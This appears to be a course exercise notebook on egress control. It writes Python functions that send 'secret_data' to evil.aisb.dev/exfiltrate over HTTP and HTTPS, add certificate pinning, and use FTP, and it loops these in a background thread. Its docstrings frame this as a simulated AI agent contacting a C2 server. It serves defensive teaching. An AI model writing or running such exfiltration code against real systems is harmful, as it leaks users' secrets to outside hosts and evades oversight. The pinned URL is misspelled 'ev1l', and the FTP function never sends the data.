# %%
import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock
import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    try:
        url = "http://evil.aisb.dev/exfiltrate"
        result = requests.get(url, params={"data": secret_data}, timeout=5)
        if result.status_code == 200:
            return result.text
        else:
            return None
    except requests.exceptions.ConnectionError:
        return None


# %%
# from w1d2_test import test_make_evil_request

# test_make_evil_request(make_evil_request)

# exfiltrate_data = make_evil_request

# %%


def make_evil_request_https(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS to evil.aisb.dev with secret data.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    try:
        url = "https://evil.aisb.dev/exfiltrate"
        result = requests.get(url, params={"data": secret_data}, timeout=5)
        if result.status_code == 200:
            return result.text
        else:
            return None
    except requests.exceptions.ConnectionError:
        return None


from w1d2_test import test_make_evil_request_https

# test_make_evil_request_https(make_evil_request_https)


# Update the exfiltrate_data function to use HTTPS
exfiltrate_data = make_evil_request_https


# %%
def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.

    This function uses certificate pinning to ensure we're talking to the real
    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement certificate pinning:
    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
    #   2. Use verify='isrg-root-x1.pem' as a parameter to requests to pin the certificate
    #   4. Return the response text if successful, None otherwise
    try:
        url = "https://ev1l.aisb.dev/exfiltrate"
        verify_file = "isrg-root-x1.pem"
        result = requests.get(url, params={"data": secret_data}, timeout=5, verify=verify_file)

        if result.status_code == 200:
            return result.text
        else:
            return None
    except Exception:
        return None


# %%
# from w1d2_test import test_make_evil_request_pinned

# test_make_evil_request_pinned(make_evil_request_pinned)


# %%
def make_evil_request_ftp(secret_data: str) -> Optional[str]:
    """
    Send a request over FTP to ftp.scene.org with secret data.

    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    from ftplib import FTP

    # TODO: Implement the function to:
    #   1. Connect to ftp.scene.org using the ftplib library
    #   2. Read some data (e.g., list files in the root directory)
    #   3. Return the response text if successful, None otherwise
    try:
        url = "ftp.scene.org"
        ftp = FTP(url, timeout=5)
        ftp.login()
        result = ftp.nlst()
        str_result = str(result)
        # print(str_result)
        return str_result
    except Exception:
        return None


from w1d2_test import test_make_evil_request_ftp

test_make_evil_request_ftp(make_evil_request_ftp)

exfiltrate_data = make_evil_request_ftp

# %%


if __name__ == "__main__":  # Only executed when running the script directly
    """
    Make requests to the evil server with different secret data.
    This simulates an AI agent repeatedly trying to exfiltrate data.
    """

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break

    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()
